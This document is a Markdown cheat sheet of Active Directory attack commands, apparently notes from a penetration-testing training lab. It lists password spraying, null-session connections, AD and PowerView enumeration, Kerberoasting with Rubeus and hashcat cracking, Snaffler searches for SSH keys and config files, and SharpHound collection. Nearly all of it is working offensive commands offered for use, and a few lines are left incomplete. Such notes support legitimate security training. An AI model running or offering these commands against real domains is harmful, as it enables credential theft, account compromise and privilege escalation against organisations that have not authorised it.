## Windows Enumerating (From Windows)
#### Net use
`net use \\DC01\ipc$ "" /u:""`

#### Domain Password Spray
`Import-Module .\DomainPasswordSpray.ps1`
`Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`

# Credential Enumeration (Active Directory Module)
```powershell
Get-Module (Module Discovery)
Import-Module ActiveDirectory (Adds the Module)
Get-ADDomain (Gets the Domain information)

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName (Filtering for accounts with ServicePrincipalName)

# Getting the domain trusts
Get-ADTrust -Filter *

# Print more detailed information regarding the trusts
Get-ADGroup -Filter * | select name

# Detailed group information
Get-ADGroup -Identity "Backup Operators"

# Group Membership
Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView
```powershell
Import-Module .\PowerView.ps1
# Gets the user information
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property

# Recursive Group Membership
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Trust Enumeration
Get-DomainTrustMapping

# Testing local Admin Access
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# Finding the Users SPN Set
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Exporting tickets through a CSV file

```

### Rubeus
```powershell
.\Rubeus.exe

.\Rubeus.exe kerberoast /stats

.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

.\Rubeus.exe kerberoast /user:testspn /nowrap

hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```
### Snaffler
```powershell
# This will give possible SSH keys, Config files and other data
Snaffler.exe -s -d domain.local -o snaffler.log -v data
.\Snaffler.exe -d domain -s -v data
```

### SharpHound
```powershell
.\SharpHound.exe -c All --zipfilename filename

# Then typing Bloodhound then enter the credentials.
```